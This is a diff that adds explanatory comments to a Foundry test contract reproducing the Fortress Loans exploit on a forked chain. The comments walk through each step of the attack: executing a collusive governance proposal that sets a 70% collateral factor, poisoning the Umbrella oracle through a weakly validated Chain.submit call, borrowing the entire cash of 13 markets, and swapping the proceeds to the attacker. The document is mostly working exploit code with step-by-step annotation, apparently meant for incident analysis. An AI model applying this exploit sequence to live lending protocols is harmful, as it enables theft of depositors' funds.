@@ -140,10 +140,21 @@ contract ProposalCreateFactory {}
 contract Attack is Test {
     /* Method 0x2b69be8e */
     function exploit() public {
-        // Excute Proposal 11
+        // VULNERABILITY: Governance proposal enables high collateral factor for manipulable low-liquidity token (fFTS)
+        // The GovernorAlpha (admin) can call Unitroller._setCollateralFactor(fFTS, 0.7e18) to enable FTS as collateral.
+        // No check for liquidity depth, market cap, or price feed robustness of the underlying token.
+        // Combined with later oracle manipulation, this gives attacker enormous borrowing power from tiny 100 FTS deposit.
+        // Impact: Allows draining of lending pool liquidity using inflated collateral value.
+        // See Unitroller.sol:4598 _setCollateralFactor and borrowAllowed.
+
+        // EXPLOIT STEP 1: Execute the queued governance proposal (proposal 11) to set collateral factor for fFTS to 70%.
+        // This was proposed earlier via GovernorAlpha.propose targeting Unitroller._setCollateralFactor.
+        // Precondition: Proposal must have reached quorum via votes (including attacker's and a colluding voter).
+        // At execution, oracle price for FTS must be non-zero (to pass the SET_COLLATERAL_FACTOR_WITHOUT_PRICE check).
         IGovernorAlpha(GovernorAlpha).execute(11);
         emit log_string("\t[info] Executed Proposal Id 11");
 
+        // EXPLOIT STEP 2: Manipulate the price oracle by submitting fake high prices via the Umbrella Chain data feed.
         // Manipulate the price oracle
         bytes32 _root = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d886;
         bytes32[] memory _keys = new bytes32[](2);
@@ -167,17 +178,30 @@ contract Attack is Test {
         _s[1] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d832;
         _s[2] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d110;
         _s[3] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d841;
+        // VULNERABILITY: Weak signature validation in Chain.submit() allows price manipulation for FTS and MAHA
+        // In Chain.sol:submit, signatures are recovered and staked balance summed, but the 66% power check is commented out:
+        //   // require(power * 100 / staked >= 66, "not enough power was gathered");
+        // Only requires i >= requiredSignatures (which was apparently satisfiable with the provided 4 sigs).
+        // Data for keys FTS-USD and MAHA-USD are written directly to fcds storage and later read as "current value".
+        // No bounds check on value magnitude, no min-stake-per-submitter, allowing attacker to set 4e34 (absurdly high) prices.
+        // These flow to: FortressPriceOracle.getUmbrellaPrice -> getUnderlyingPrice(fFTS) and PriceFeed.fetchPrice (via umbOracle).
+        // Impact: Collateral value of fFTS (and MAHA) becomes ~infinite relative to actual market price, enabling over-borrow of entire pool cash.
+        // EXPLOIT STEP 3: Call Chain.submit() with attacker-chosen high price data + valid-looking signatures (from real tx).
+        // This poisons the oracle for the subsequent borrow checks.
         IChain(ChainContract).submit(uint32(block.timestamp), _root, _keys, _values, _v, _r, _s);
         emit log_string("\t[info] Chain.submit() Success");
 
         // Check the FTS price is manipulated (from Fortress Loans perspective 📈)
         // This article explains how Chain.submit() affected FTS price: https://blog.csdn.net/Timmbe/article/details/124678475
+        // EXPLOIT STEP 4: Verify the manipulated price is now live in Fortress's oracle view.
         uint256 _checkpoint;
         _checkpoint = IFortressPriceOracle(FortressPriceOracle).getUnderlyingPrice(FToken(fFTS));
         assert(_checkpoint == 4e34); // make sure have same result as mainnet tx
         emit log_string("\t[info] FortressPriceOracle.getUnderlyingPrice(FToken(fFTS)) Success");
 
         // Fetch price
+        // EXPLOIT STEP 5: Trigger PriceFeed.fetchPrice() which reads the poisoned UMB oracle price (now 2e34 after scaling).
+        // The PriceFeed is used (or affects) accounting/liquidation in the Fortress ecosystem.
         _checkpoint = IPriceFeed(PriceFeed).fetchPrice();
         assert(_checkpoint == 2e34); // make sure have same result as mainnet tx
         emit log_string("\t[info] PriceFeed.fetchPrice() Success");
@@ -189,6 +213,9 @@ contract Attack is Test {
         emit log_string("\t[info] Unitroller.enterMarkets(fFTS) Success");
 
         // Provide 100 FTS Token as collateral, mint fFTS
+        // EXPLOIT STEP 6: Deposit the 100 FTS (sent via prior tx/cheat) into fFTS (the cToken).
+        // mint() issues fFTS shares. Because CF=70% was set, and oracle price is 4e34, the "collateral value" is enormous.
+        // No sanity on price (e.g. deviation from TWAP, volume filter) or CF for this token.
         IFTS(FTS).approve(fFTS, type(uint256).max);
         uint256 _FTS_balance = IFTS(FTS).balanceOf(address(this));
         IfFTS(fFTS).mint(_FTS_balance);
@@ -229,12 +256,23 @@ contract Attack is Test {
         ];
 
         for (uint8 i; i < Delegators.length; i++) {
+            // EXPLOIT STEP 7: For each of 13 fToken markets, query getCash() (available liquidity) and borrow the entire amount.
+            // In borrowAllowed (comptroller), getHypotheticalAccountLiquidityInternal uses:
+            //   collateralValue = collateralFactor * exchangeRate * oraclePrice * fTokenBalance
+            // With oraclePrice inflated by 4e34 and CF=0.7, the  ~500 fFTS balance (from 100 FTS) provides
+            // sufficient "liquidity" to borrow millions in other assets without shortfall.
+            // The fToken.borrow succeeds because price error and liquidity checks pass under manipulated state.
+            // Impact: Directly drains the cash reserves of every listed market (fbnb, fusdc, ... fshib).
             uint256 borrowAmount = Delegators[i].getCash();
             Delegators[i].borrow(borrowAmount);
         }
 
         emit log_string("\t[info] 13 markets ERC-20 token borrow Success");
 
+        // EXPLOIT STEP 8: Use the also-manipulated MAHA price (set to 4e34 in same submit) to open a large Trove
+        // in the MAHA/ARTH protocol (BorrowerOperations). The high oracle price for MAHA collateral lets attacker
+        // deposit their MAHA and extract large ARTH / ARTHUSD, which is further swapped.
+        // This is secondary profit extraction leveraging the same oracle poisoning.
         IERC20(MAHA).approve(BorrowerOperations, type(uint256).max);
         IBorrowerOperations(BorrowerOperations).openTrove(
             1e18, 1e27, IERC20(MAHA).balanceOf(address(this)), address(0), address(0), address(0)
@@ -251,6 +289,16 @@ contract Attack is Test {
     }
 
     function withdrawAll() public {
+        // EXPLOIT STEP 9 (post-exploit): Convert all stolen underlyings (from the borrows) via Pancake swaps
+        // (Asset -> WBNB -> USDT) and ETH->USDT, then transfer profits to attacker EOA.
+        // The kill() later selfdestructs the contract.
+        // VULNERABILITY ROOT CAUSE SUMMARY:
+        // 1. Oracle (FortressPriceOracle + upstream Chain + PriceFeed) trusts submit() data with insufficient validation.
+        // 2. Governance (via proposal) can instantly enable high-CF collateral on tokens whose price is easy to poison.
+        // 3. No circuit breakers, price deviation checks, or minimum liquidity requirements before allowing borrows against new collateral.
+        // Result: Attacker with 100 FTS collateral borrows the entire reserves of 13 markets (~3M USD impact).
+        // See also: Chain.submit (missing power check), FortressPriceOracle.getUmbrellaPrice, Unitroller._setCollateralFactor + getHypotheticalAccountLiquidityInternal.
+
         // Get all Fortress Loans markets
         address[] memory markets = IUnitroller(Unitroller).getAllMarkets();
         address fbnb = markets[0]; // 0xe24146585e882b6b59ca9bfaaaffed201e4e5491
@@ -351,6 +399,11 @@ contract Hacker is Test {
     }
 
     function testExploit() public {
+        // EXPLOIT SETUP PHASE (reproduces the on-chain tx sequence leading to the hack)
+        // The full attack requires (1) governance proposal to enable fFTS collateral at high CF,
+        // (2) accumulating enough votes (attacker + colluding voter), (3) queue+execute delay,
+        // (4) funding the attack contract with FTS+MAHA, (5) executing the price-poison + borrow.
+
         // txId : 0x18dc1cafb1ca20989168f6b8a087f3cfe3356d9a1edd8f9d34b3809985203501
         // Do : Attacker Create [ProposalCreater] Contract
         vm.rollFork(17_490_837); // make sure start from block 17490837
@@ -362,6 +415,9 @@ contract Hacker is Test {
 
         // txId : 0x12bea43496f35e7d92fb91bf2807b1c95fcc6fedb062d66678c0b5cfe07cc002
         // Do : Create Proposal Id 11
+        // EXPLOIT STEP (prep) 0: Create governance proposal via a factory contract (to mask origin?).
+        // Targets Unitroller with calldata to call _setCollateralFactor(fFTS, 70%).
+        // This proposal ID=11 will later be executable after voting/queue.
         vm.createSelectFork("http://127.0.0.1:8546", 17_490_882);
 
         address[] memory _target = new address[](1);
@@ -382,6 +438,7 @@ contract Hacker is Test {
 
         // txId : 0x83a4f8f52b8f9e6ff1dd76546a772475824d9aa5b953808dbc34d1f39250f29d
         // Do : Vote Proposal Id 11
+        // EXPLOIT STEP (prep) 1: A colluding / malicious voter (EOA with sufficient FTS votes) casts yes vote.
         vm.createSelectFork("http://127.0.0.1:8546", 17_570_125);
         vm.prank(0x58f96A6D9ECF0a7c3ACaD2f4581f7c4e42074e70); // Malicious voter
         IGovernorAlpha(GovernorAlpha).castVote(11, true);
@@ -389,6 +446,7 @@ contract Hacker is Test {
 
         // txId : 0xc368afb2afc499e7ebb575ba3e717497385ef962b1f1922561bcb13f85336252
         // Do : Vote Proposal Id 11
+        // EXPLOIT STEP (prep) 2: Attacker also votes yes on their own proposal (using their acquired voting power).
         vm.createSelectFork("http://127.0.0.1:8546", 17_570_164);
         vm.prank(attacker);
         IGovernorAlpha(GovernorAlpha).castVote(11, true);
@@ -396,6 +454,7 @@ contract Hacker is Test {
 
         // txId : 0x647c6e89cd1239381dd49a43ca2f29a9fdeb6401d4e268aff1c18b86a7e932a0
         // Do : Queue Proposal Id 11
+        // EXPLOIT STEP (prep) 3: After voting period, queue the proposal (starts timelock delay).
         vm.createSelectFork("http://127.0.0.1:8546", 17_577_532);
         vm.prank(attacker);
         IGovernorAlpha(GovernorAlpha).queue(11);
@@ -403,6 +462,7 @@ contract Hacker is Test {
 
         // txId : 0x4800928c95db2fc877f8ba3e5a41e208231dc97812b0174e75e26cca38af5039
         // Do : Create Attack Contract
+        // EXPLOIT STEP (prep) 4: Deploy the Attack contract at a specific nonce to match on-chain address.
         vm.createSelectFork("http://127.0.0.1:8546", 17_634_589);
         vm.setNonce(attacker, 69);
         vm.startPrank(attacker);
@@ -415,6 +475,7 @@ contract Hacker is Test {
         // txId : 0x6a04f47f839d6db81ba06b17b5abbc8b250b4c62e81f4a64aa6b04c0568dc501
         // Do : Send 3.0203 MahaDAO to Attack Contract
         // Note : This tx is not part of exploit chain, so we just cheat it to skip some pre-swap works ;)
+        // EXPLOIT STEP (prep) 5: Fund attack contract with MAHA (used later for secondary extraction via inflated MAHA price).
         stdstore.target(MAHA).sig(IERC20(MAHA).balanceOf.selector).with_key(address(attackContract)).checked_write(
             3_020_309_536_199_074_866
         );
@@ -424,6 +485,7 @@ contract Hacker is Test {
         // txId : 0xd127c438bdac59e448810b812ffc8910bbefc3ebf280817bd2ed1e57705588a0
         // Do : Send 100 FTS to Attack Contract
         // Note : This tx is not part of exploit chain, so we just cheat it to skip some pre-swap works ;)
+        // EXPLOIT STEP (prep) 6: Fund attack contract with 100 FTS. This small amount will become the "collateral" after price + CF manipulation.
         stdstore.target(FTS).sig(IFTS(FTS).balanceOf.selector).with_key(address(attackContract)).checked_write(
             100 ether
         );
@@ -432,6 +494,7 @@ contract Hacker is Test {
 
         // txId : 0x13d19809b19ac512da6d110764caee75e2157ea62cb70937c8d9471afcb061bf
         // Do : Execute Proposal Id 11
+        // EXPLOIT STEP (prep) 7: Advance chain state to proposal execution window and invoke exploit() which chains execute + oracle poison + borrows.
         vm.roll(17_634_663); // No fork here, otherwise will get Error("do not spam") in Chain.sol
         vm.warp(1_652_042_082); // 2022-05-08 20:34:42 UTC+0
         vm.startPrank(attacker);
@@ -441,6 +504,7 @@ contract Hacker is Test {
 
         // txId : 0x851a65865ec89e64f0000ab973a92c3313ea09e80eb4b4660195a14d254cd425
         // Do : Withdraw All
+        // EXPLOIT STEP (final) 10: Call withdrawAll() which swaps stolen assets to USDT and sends to attacker.
         vm.roll(17_634_670); // We need to verify the reproduce run as expected, so don't use createSelectFork()
         vm.warp(1_651_998_903); // 2022-05-08 20:35:03 UTC+0
         vm.startPrank(attacker);
